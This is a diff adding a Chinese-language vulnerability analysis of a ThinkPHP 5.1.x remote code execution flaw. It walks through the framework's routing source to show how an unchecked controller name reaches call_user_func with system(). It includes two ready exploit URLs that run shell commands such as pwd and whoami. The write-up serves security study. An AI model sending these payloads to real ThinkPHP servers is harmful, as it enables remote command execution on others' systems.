@@ -1466,4 +1466,481 @@ class Index
 
 3. 没有设置`$this->options['prefix']`
 
-#
+# RCE分析
+
+>没有对控制器名进行合法性校验,导致在未开启强制路由的情况下,用户可以调用任意类的任意方法,最终导致远程代码执行漏洞的产生
+
+[ThinkPHP5漏洞分析之代码执行9](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md)
+
+[ThinkPHP5漏洞分析之代码执行10](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md)
+
+## 5.1.x版本
+
+`?s=index/\think\Request/input&filter[]=system&data=pwd`
+
+```php
+#/public/index.php
+<?php
+// [ 应用入口文件 ]
+namespace think;
+
+// 加载基础文件
+require __DIR__ . '/../thinkphp/base.php';
+
+// 支持事先使用静态方法设置Request对象和Config对象
+
+// 执行应用并响应
+Container::get('app')->run()->send();#进入App->run
+```
+
+```php
+#thinkphp/library/think/App.php
+    /**
+     * 执行应用程序
+     * @access public
+     * @return Response
+     * @throws Exception
+     */
+    public function run()
+    {
+        try {
+            ...
+            $dispatch = $this->dispatch;
+            if (empty($dispatch)) {
+                // 路由检测
+                $dispatch = $this->routeCheck()->init();#进行路由检测
+            }
+            ...
+        }
+        ...
+
+        $this->middleware->add(function (Request $request, $next) use ($dispatch, $data) {
+            return is_null($data) ? $dispatch->run() : $data;#\think\route\Dispatch::run
+        });
+
+        $response = $this->middleware->dispatch($this->request);
+        /*
+         * 中间件调度
+         * @access public
+         * @param  Request  $request
+         * @param  string   $type  中间件类型
+
+        public function dispatch(Request $request, $type = 'route')
+        {
+            return call_user_func($this->resolve($type), $request);#通过这个call_user_func进入$dispatch->run()
+        }
+        */
+
+        ...
+
+        return $response;
+    }
+    
+    /**
+     * URL路由检测（根据PATH_INFO)
+     * @access public
+     * @return Dispatch
+     */
+    public function routeCheck()
+    {
+        ...
+        // 获取应用调度信息
+        $path = $this->request->path();#获取当前请求URL的pathinfo信息 $path=index/\think\Request/input
+        ...
+        // 路由检测 返回一个Dispatch对象
+        $dispatch = $this->route->check($path, $must);#检测URL路由
+        #$dispatch->dispatch = index|\think\Request|input
+        ...
+        return $dispatch;
+    }
+
+    /**
+     * 检测URL路由
+     * @access public
+     * @param  string    $url URL地址
+     * @param  bool      $must 是否强制路由
+     * @return Dispatch
+     * @throws RouteNotFoundException
+     */
+    public function check($url, $must = false)
+    {
+        // 自动检测域名路由
+        $domain = $this->checkDomain();
+        $url    = str_replace($this->config['pathinfo_depr'], '|', $url);#$url = index|\think\Request|input
+        ...
+        // 默认路由解析
+        return new UrlDispatch($this->request, $this->group, $url, [
+            'auto_search' => $this->autoSearchController,
+        ]);
+    }
+```
+
+```php
+#thinkphp/library/think/route/dispatch/Url.php
+class Url extends Dispatch
+{
+    public function init()
+    {
+        // 解析默认的URL规则
+        $result = $this->parseUrl($this->dispatch);
+
+        return (new Module($this->request, $this->rule, $result))->init();#\think\route\dispatch\Module::init
+    }
+
+    /**
+     * 解析URL地址
+     * @access protected
+     * @param  string   $url URL
+     * @return array
+     */
+    protected function parseUrl($url)
+    {
+        ...
+        list($path, $var) = $this->rule->parseUrlPath($url);#\think\route\Rule::parseUrlPath 解析URL的pathinfo参数和变量
+        /*
+        $path = {数组} [3]
+         0 = "index"
+         1 = "\think\Request"
+         2 = "input"
+        */
+        if (empty($path)) {
+            return [null, null, null];
+        }
+
+        // 解析模块
+        $module = $this->rule->getConfig('app_multi_module') ? array_shift($path) : null;
+        if ($this->param['auto_search']) {
+            ...
+        } else {
+            // 解析控制器
+            $controller = !empty($path) ? array_shift($path) : null;
+        }
+        // 解析操作
+        $action = !empty($path) ? array_shift($path) : null;
+        /*
+        $module = "index"
+        $controller = "\think\Request"
+        $action = "input"
+        */
+        ...
+        // 封装路由
+        $route = [$module, $controller, $action];
+        ...
+        return $route;
+    }
+}
+```
+
+```php
+#thinkphp/library/think/route/Rule.php
+    /**
+     * 解析URL的pathinfo参数和变量
+     * @access public
+     * @param  string    $url URL地址
+     * @return array
+     */
+    public function parseUrlPath($url)
+    {
+        // 分隔符替换 确保路由定义使用统一的分隔符
+        $url = str_replace('|', '/', $url);#$url=index/\think\Request/input
+        $url = trim($url, '/');
+        $var = [];
+
+        if (false !== strpos($url, '?')) {
+            ...
+        } elseif (strpos($url, '/')) {
+            // [模块/控制器/操作]
+            $path = explode('/', $url);
+            /*
+            $path = {数组} [3]
+             0 = "index"
+             1 = "\think\Request"
+             2 = "input"
+            */
+        }
+        ...
+
+        return [$path, $var];
+    }
+```
+
+```php
+#thinkphp/library/think/route/dispatch/Module.php
+    public function init()
+    {
+        ...
+
+        $result = $this->dispatch;
+        /*
+        $result = {数组} [3]
+         0 = "index"
+         1 = "\think\Request"
+         2 = "input"
+        */
+
+        if (is_string($result)) {
+            $result = explode('/', $result);
+        }
+
+        if ($this->rule->getConfig('app_multi_module')) {
+            // 多模块部署
+            $module    = strip_tags(strtolower($result[0] ?: $this->rule->getConfig('default_module')));#获取模块名
+            ...
+        }
+        ...
+        $controller       = strip_tags($result[1] ?: $this->rule->getConfig('default_controller'));#获取控制器名
+        $this->controller = $convert ? strtolower($controller) : $controller;
+        $this->actionName = strip_tags($result[2] ?: $this->rule->getConfig('default_action'));#获取操作名
+
+        // 设置当前请求的控制器、操作
+        $this->request
+            ->setController(Loader::parseName($this->controller, 1))
+            ->setAction($this->actionName);
+
+        return $this;
+        /*
+        $this = {think\route\dispatch\Module} [9]
+         controller = "\think\request"
+         actionName = "input"
+        */
+    }
+```
+
+```php
+#thinkphp/library/think/route/Dispatch.php
+    /**
+     * 执行路由调度
+     * @access public
+     * @return mixed
+     */
+    public function run()
+    {
+        ...
+        $data = $this->exec();
+        return $this->autoResponse($data);
+    }
+
+    public function exec()
+    {
+        // 监听module_init
+        $this->app['hook']->listen('module_init');
+
+        try {
+            // 实例化控制器
+            $instance = $this->app->controller($this->controller,
+                $this->rule->getConfig('url_controller_layer'),
+                $this->rule->getConfig('controller_suffix'),
+                $this->rule->getConfig('empty_controller'));
+            #$instance = {think\Request} [39]
+            ...
+        } ...
+
+        $this->app['middleware']->controller(function (Request $request, $next) use ($instance) {#再通过一次前面提到的中间件调度函数,进入这个匿名函数
+            // 获取当前操作名
+            $action = $this->actionName . $this->rule->getConfig('action_suffix');#$action = "input"
+
+            if (is_callable([$instance, $action])) {
+                // 执行操作方法
+                $call = [$instance, $action];
+                /*
+                $call = {数组} [2]
+                 0 = {think\Request} [39]
+                 1 = "input"
+                 */
+
+                // 严格获取当前操作方法名
+                $reflect    = new ReflectionMethod($instance, $action);
+                $methodName = $reflect->getName();
+                $suffix     = $this->rule->getConfig('action_suffix');
+                $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
+                $this->request->setAction($actionName);
+
+                // 自动获取请求变量
+                $vars = $this->rule->getConfig('url_param_type')
+                ? $this->request->route()
+                : $this->request->param();
+                $vars = array_merge($vars, $this->param);
+            }
+            ...
+            $data = $this->app->invokeReflectMethod($instance, $reflect, $vars);#\think\Container::invokeReflectMethod
+            #利用反射机制调用类中的方法,三个参数均由用户输入控制
+            /*
+            $instance = {think\Request} [39]
+            $reflect = {ReflectionMethod} [2]
+             name = "input"
+             class = "think\Request"
+            $vars = {数组} [2]
+             filter = {数组} [1]
+              0 = "system"
+             data = "pwd"
+            */
+            return $this->autoResponse($data);
+        });
+
+        return $this->app['middleware']->dispatch($this->request, 'controller');
+    }
+```
+
+```php
+#thinkphp/library/think/Container.php
+    /**
+     * 调用反射执行类的方法 支持参数绑定
+     * @access public
+     * @param  object  $instance 对象实例
+     * @param  mixed   $reflect 反射类
+     * @param  array   $vars   参数
+     * @return mixed
+     */
+    public function invokeReflectMethod($instance, $reflect, $vars = [])
+    {
+        $args = $this->bindParams($reflect, $vars);
+
+        return $reflect->invokeArgs($instance, $args);
+    }
+```
+
+```php
+#thinkphp/library/think/Request.php
+    /**
+     * 获取变量 支持过滤和默认值
+     * @access public
+     * @param  array         $data 数据源
+     * @param  string|false  $name 字段名
+     * @param  mixed         $default 默认值
+     * @param  string|array  $filter 过滤函数
+     * @return mixed
+     */
+    public function input($data = [], $name = '', $default = null, $filter = '')
+    {
+        ...
+        // 解析过滤器
+        $filter = $this->getFilter($filter, $default);
+        /*
+        $filter = {数组} [2]
+         0 = "system"
+         1 = null
+        */
+        if (is_array($data)) {
+            ...
+        } else {
+            $this->filterValue($data, $name, $filter);
+        }
+        ...
+    }
+
+    /**
+     * 递归过滤给定的值
+     * @access public
+     * @param  mixed     $value 键值
+     * @param  mixed     $key 键名
+     * @param  array     $filters 过滤方法+默认值
+     * @return mixed
+     */
+    private function filterValue(&$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);#达到RCE call_user_func(system, "pwd")
+            
+        ...
+    }
+```
+
+漏洞产生的原因在于框架对控制器名没有进行检测,我们使用`?s=model/controller/action`传入路由
+
+在`\think\App::run`中通过`$dispatch = $this->routeCheck()->init();`调用`\think\App::routeCheck`进行路由检测并得到`index|\think\Request|input`,然后进入`\think\route\dispatch\Url::init`,在其中有调用`parseUrl`方法进行路由解析
+
+在`\think\route\dispatch\Url::parseUrl`中返回封装后的路由为
+
+```php
+$route = {数组} [3]
+ 0 = "index"
+ 1 = "\think\Request"
+ 2 = "input"
+```
+
+在`\think\route\dispatch\Url::init`的最后通过`return (new Module($this->request, $this->rule, $result))->init();`实例化了`Module`类并调用了其中的`init`方法
+
+在`\think\route\dispatch\Module::init`中获取到了模块名,控制器名,操作名并将其设置为类的属性,最终`\think\App::run`中的`$dispatch`设置为`\think\route\dispatch\Module`类的对象并且其中包含模块名等属性
+
+上述步骤中缺少对控制器名的检测
+
+通过`$this->middleware->add(function (Request $request, $next) use ($dispatch, $data) {return is_null($data) ? $dispatch->run() : $data;});`和`\think\Middleware::dispatch`(中间件调度)中的`call_user_func`计入到`$dispatch->run()`中,即`\think\route\Dispatch::run`
+
+在`\think\route\Dispatch::run`中通过`$data = $this->exec();`进入到`\think\route\dispatch\Module::exec`中
+
+在`exec`方法中,通过`$this->app->invokeReflectMethod($instance, $reflect, $vars);`进入`\think\Container::invokeReflectMethod`中并通过调用反射执行类的方法`$reflect->invokeArgs($instance, $args)`成功进入到`\think\Request::input`中
+
+而在`input`方法中对`filterValue`进行了调用,通过`filterValue`里面的`call_user_func`达到了RCE的目的
+
+除了使用`?s=index/\think\Request/input&filter[]=system&data=pwd`外,还可以使用`?s=index/\think\Container/invokeFunction&function=call_user_func_array&vars[function_name]=system&vars[parameters][]=whoami`
+
+利用`invokeFunction`中的`call_user_func_array`同样可以达到RCE的目的
+
+```php
+#thinkphp/library/think/Container.php
+    /**
+     * 执行函数或者闭包方法 支持参数调用
+     * @access public
+     * @param  mixed  $function 函数或者闭包
+     * @param  array  $vars     参数
+     * @return mixed
+     */
+    public function invokeFunction($function, $vars = [])
+    {
+        try {
+            $reflect = new ReflectionFunction($function);
+
+            $args = $this->bindParams($reflect, $vars);
+
+            return call_user_func_array($function, $args);
+        } catch (ReflectionException $e) {
+            throw new Exception('function not exists: ' . $function . '()');
+        }
+    }
+
+    /**
+     * 绑定参数
+     * @access protected
+     * @param  \ReflectionMethod|\ReflectionFunction $reflect 反射类
+     * @param  array                                 $vars    参数
+     * @return array
+     */
+    protected function bindParams($reflect, $vars = [])
+    {
+        if ($reflect->getNumberOfParameters() == 0) {
+            return [];
+        }
+
+        // 判断数组类型 数字数组时按顺序绑定参数
+        reset($vars);
+        $type   = key($vars) === 0 ? 1 : 0;
+        $params = $reflect->getParameters();
+
+        foreach ($params as $param) {
+            $name      = $param->getName();
+            $lowerName = Loader::parseName($name);
+            $class     = $param->getClass();
+
+            if ($class) {
+                $args[] = $this->getObjectParam($class->getName(), $vars);
+            } elseif (1 == $type && !empty($vars)) {
+                $args[] = array_shift($vars);
+            } elseif (0 == $type && isset($vars[$name])) {
+                $args[] = $vars[$name];
+            } elseif (0 == $type && isset($vars[$lowerName])) {
+                $args[] = $vars[$lowerName];
+            } elseif ($param->isDefaultValueAvailable()) {
+                $args[] = $param->getDefaultValue();
+            } else {
+                throw new InvalidArgumentException('method param miss:' . $name);
+            }
+        }
+
+        return $args;
+    }
+```
+
